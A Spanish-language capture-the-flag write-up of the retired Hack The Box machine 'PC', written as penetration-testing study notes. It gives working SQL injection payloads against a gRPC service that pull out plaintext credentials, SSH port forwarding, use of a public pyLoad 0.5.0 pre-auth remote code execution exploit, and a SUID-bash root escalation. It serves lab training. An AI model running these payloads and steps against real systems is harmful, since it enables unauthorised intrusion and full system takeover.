---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - SQLi
  - SSH
  - LocalPortForwarding
  - RCE
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Identificación del sistema|Identificación del sistema]]
	- [[#Enumeración#Escaneo de puertos|Escaneo de puertos]]
	- [[#Enumeración#Enumeración de gRPC|Enumeración de gRPC]]
- [[#Explotación|Explotación]]
	- [[#Explotación#SQLi|SQLi]]
	- [[#Explotación#SSH|SSH]]
- [[#Escalada de Privilegios|Escalada de Privilegios]]
	- [[#Escalada de Privilegios#Local Port Forwarding|Local Port Forwarding]]
	- [[#Escalada de Privilegios#RCE|RCE]]


---
# PC

![](Screenshots/Pasted%20image%2020260423125745.png)

>Máquina retirada de Hack The Box llamada **PC**, que presenta un entorno **Linux** con servicios **SSH** y **gRPC** expuestos.  
>La explotación comienza con la **enumeración del servicio gRPC** mediante la herramienta `grpcurl`, lo que permite identificar distintos métodos disponibles como `LoginUser`, `RegisterUser` y `getInfo`, así como la estructura de las peticiones.  
>Tras registrar un usuario y autenticarse, se obtiene un **token JWT** necesario para interactuar con los endpoints protegidos del servicio.  
>Durante el análisis de las peticiones, se detecta una vulnerabilidad de **inyección SQL (SQLi)** en el parámetro `id`, que permite extraer información de la base de datos SQLite, incluyendo **credenciales en texto claro**.  
>Con estas credenciales se obtiene acceso inicial al sistema mediante **SSH**, desde donde se realiza una enumeración interna que revela la existencia de **servicios adicionales en localhost**.  
>Mediante **port forwarding con SSH**, se expone un panel web interno correspondiente a **pyLoad**, el cual es vulnerable a **ejecución remota de código (RCE)** sin autenticación.  
>Finalmente, se explota esta vulnerabilidad para ejecutar comandos en el sistema y se abusa del bit **SUID** en `/bin/bash` para escalar privilegios, logrando acceso completo como **root**.

---
## Enumeración
### Identificación del sistema

```PowerShell
ping -c 1 10.129.24.239
PING 10.129.24.239 (10.129.24.239) 56(84) bytes of data.
64 bytes from 10.129.24.239: icmp_seq=1 ttl=63 time=33.5 ms

--- 10.129.24.239 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 33.526/33.526/33.526/0.000 ms
```

El `TTL=63` indica que probablemente estamos ante un sistema Linux.
### Escaneo de puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 10.129.24.239 -oG allPorts
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
50051/tcp open  unknown syn-ack ttl 63
```

```PowerShell
nmap -p22,50051 -sCV 10.129.24.239 -oN targeted
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
50051/tcp open  grpc
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Enumeración de gRPC

Se instala [gRPCurl](https://github.com/fullstorydev/grpcurl).

Se utiliza **gRRCurl** para enumerar los servicios disponibles en el servidor gRPC, ya que este protocolo no es directamente accesible desde un navegador como HTTP.

```PowerShell
wget https://github.com/fullstorydev/grpcurl/releases/download/v1.9.3/grpcurl_1.9.3_linux_amd64.deb
sudo dpkg -i grpcurl_1.9.3_linux_amd64.deb
rm -r grpcurl_1.9.3_linux_amd64.deb
```

Se listan los servicios disponibles en el servidor gRPC.

```PowerShell
grpcurl -plaintext 10.129.24.239:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

Se identifican los métodos.

```PowerShell
grpcurl -plaintext 10.129.24.239:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo
```

Se enumeran todos las funciones.

```PowerShell
grpcurl -plaintext 10.129.24.239:50051 describe SimpleApp
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
```

```PowerShell
grpcurl -plaintext 10.129.24.239:50051 describe LoginUserRequest
LoginUserRequest is a message:
message LoginUserRequest {
  string username = 1;
  string password = 2;
}
```

```PowerShell
grpcurl -plaintext 10.129.24.239:50051 describe RegisterUserRequest
RegisterUserRequest is a message:
message RegisterUserRequest {
  string username = 1;
  string password = 2;
}
```

```PowerShell
grpcurl -plaintext 10.129.24.239:50051 describe getInfoRequest
getInfoRequest is a message:
message getInfoRequest {
  string id = 1;
}
```

Esto permite identificar posibles puntos de interacción con la aplicación, como autenticación o acceso a información.

Se registra un nuevo usuario.

```
grpcurl -plaintext -format text -d 'username: "m4num0re", password: "m4num0re"' 10.129.24.239:50051 SimpleApp.RegisterUser
message: "Account created for user m4num0re!"
```

Se inicia sesión con el usuario `m4num0re`.

```PowerShell
grpcurl -plaintext -format text -d 'username: "m4num0re", password: "m4num0re"' 10.129.24.239:50051 SimpleApp.LoginUser
message: "Your id is 134."
```

Se obtiene la información del usuario `m4num0re`.

```PowerShell
grpcurl -plaintext -format text -d 'id: "134"' 10.129.24.239:50051 SimpleApp.getInfo
message: "Authorization Error.Missing 'token' header"
```

Se obtiene un **token JWT** en los headers de respuesta, utilizado por la aplicación para gestionar la autenticación entre peticiones.

```PowerShell
grpcurl -plaintext -vv -format text -d 'username: "m4num0re", password: "m4num0re"' 10.129.24.239:50051 SimpleApp.LoginUser
Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 16 bytes

Response contents:
message: "Your id is 39."

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibTRudW0wcmUiLCJleHAiOjE3NzY5NDA5Njd9.KjUZC51N0FxfZ1LA3pRBGluPEXByOUDapnttPbiCXYg'
Sent 1 request and received 1 response
Timing Data: 268.299478ms
  Dial: 67.648225ms
    BlockingDial: 67.626675ms
  InvokeRPC: 165.874379ms
```

```PowerShell
grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibTRudW0wcmUiLCJleHAiOjE3NzY5NDA5Njd9.KjUZC51N0FxfZ1LA3pRBGluPEXByOUDapnttPbiCXYg' -d 'id: "39"' 10.129.24.239:50051 SimpleApp.getInfo
message: "Will update soon."
```

---
## Explotación
### SQLi

Se detecta una posible vulnerabilidad de **inyección SQL** en el parámetro `id`, ya que la aplicación no valida correctamente la entrada del usuario.

Este payload permite verificar la existencia de la vulnerabilidad al forzar una condición siempre verdadera.

```PowerShell
grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibTRudW0wcmUiLCJleHAiOjE3NzY5NDA5Njd9.KjUZC51N0FxfZ1LA3pRBGluPEXByOUDapnttPbiCXYg' -d 'id: "39 OR 1=1"' 10.129.24.239:50051 SimpleApp.getInfo
message: "The admin is working hard to fix the issues."
```

```PowerShell
grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibTRudW0wcmUiLCJleHAiOjE3NzY5NDA5Njd9.KjUZC51N0FxfZ1LA3pRBGluPEXByOUDapnttPbiCXYg' -d 'id: "39 UNION SELECT 1-- -"' 10.129.24.239:50051 SimpleApp.getInfo
message: "1"
```

```PowerShell
grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibTRudW0wcmUiLCJleHAiOjE3NzY5NDA5Njd9.KjUZC51N0FxfZ1LA3pRBGluPEXByOUDapnttPbiCXYg' -d 'id: "39 UNION SELECT sqlite_version()--"' 10.129.24.239:50051 SimpleApp.getInfo
message: "3.31.1"
```

Se enumeran tablas y columnas para extraer información sensible de la base de datos.

```PowerShell
grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibTRudW0wcmUiLCJleHAiOjE3NzY5NDA5Njd9.KjUZC51N0FxfZ1LA3pRBGluPEXByOUDapnttPbiCXYg' -d 'id: "39 UNION SELECT name FROM sqlite_master WHERE type=\"table\";-- -"' 10.129.24.239:50051 SimpleApp.getInfo
message: "accounts"
```

```PowerShell
grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibTRudW0wcmUiLCJleHAiOjE3NzY5NDA5Njd9.KjUZC51N0FxfZ1LA3pRBGluPEXByOUDapnttPbiCXYg' -d 'id: "39 UNION SELECT GROUP_CONCAT(name, \",\") FROM pragma_table_info(\"accounts\");-- -"' 10.129.24.239:50051 SimpleApp.getInfo
message: "username,password"
```

```PowerShell
grpcurl -plaintext -format text -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoibTRudW0wcmUiLCJleHAiOjE3NzY5NDA5Njd9.KjUZC51N0FxfZ1LA3pRBGluPEXByOUDapnttPbiCXYg' -d 'id: "39 UNION SELECT GROUP_CONCAT(username |-| password) FROM accounts;-- -"' 10.129.24.239:50051 SimpleApp.getInfo
message: "adminadmin,sauHereIsYourPassWord1431"
```
### SSH

Se utiliza la credencial obtenida para acceder al sistema mediante SSH como el usuario `sau`.

```PowerShell
ssh sau@10.129.24.239
sau@pc:~$
```

La flag de `usuario` se encuentra en: `/home/sau`.

---
## Escalada de Privilegios
### Local Port Forwarding

Se identifican servicios internos escuchando en localhost, por lo que se utiliza port forwarding para acceder a ellos desde la máquina atacante.

```PowerShell
ss -tlpn
State                       Recv-Q                      Send-Q                                           Local Address:Port                                            Peer Address:Port                      Process                      
LISTEN                      0                           4096                                             127.0.0.53%lo:53                                                   0.0.0.0:*                                                      
LISTEN                      0                           128                                                    0.0.0.0:22                                                   0.0.0.0:*                                                      
LISTEN                      0                           5                                                    127.0.0.1:8000                                                 0.0.0.0:*                                                      
LISTEN                      0                           128                                                    0.0.0.0:9666                                                 0.0.0.0:*                                                      
LISTEN                      0                           128                                                       [::]:22                                                      [::]:*                                                      
LISTEN                      0                           4096                                                         *:50051                                                      *:*                                                      
```

Se realiza **Port Forwarding** mediante **SSH**.

```PowerShell
ssh -f -N -L 8000:127.0.0.1:8000 -L 9666:127.0.0.1:9666 sau@10.129.24.239
```

Se realiza un escaneo con **Nmap**,

```PowerShell
nmap -p9666 -sCV localhost
PORT     STATE SERVICE VERSION
9666/tcp open  http    CherryPy wsgiserver
| http-title: Login - pyLoad 
|_Requested resource was /login?next=http%3A%2F%2Flocalhost%3A9666%2F
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Cheroot/8.6.0
```
### RCE

Se identifica una vulnerabilidad conocida en **pyLoad 0.5.0** que permite ejecución remota de código sin autenticación.

```PowerShell
searchsploit "pyLoad"
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)                                                                                                                                                       | python/webapps/51532.py
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

searchsploit -m python/webapps/51532.py
```

```PowerShell
python3 51532.py -u http://localhost:9666/ -c 'whoami'
[+] Check if target host is alive: http://localhost:9666/
[+] Host up, let's exploit! 
[+] The exploit has be executeded in target machine.
```

Se intercepta con **Burp Suite**.

```PowerShell
HTTP_PROXY=http://127.0.0.1:8080 python3 51532.py -u http://localhost:9666/ -c 'whoami'
```

![](Screenshots/Pasted%20image%2020260423123937.png)

Se observa que el payload es codificado en URL, lo que permite modificar manualmente los comandos enviados.

```PowerShell
python3 51532.py -u http://localhost:9666/ -c 'chmod 4755 /bin/bash'
python3 51532.py -u http://localhost:9666/ -c 'chmod%2b4755%2b/bin/bash'
```

Como tenemos acceso a **SSH** se ejecuta el comando y se abusa del bit SUID establecido en `/bin/bash` para escalar privilegios a root.

```PowerShell
bash -p
bash-5.0# pwd
/root
```

La flag de `root` se encuentra en `/root`.

---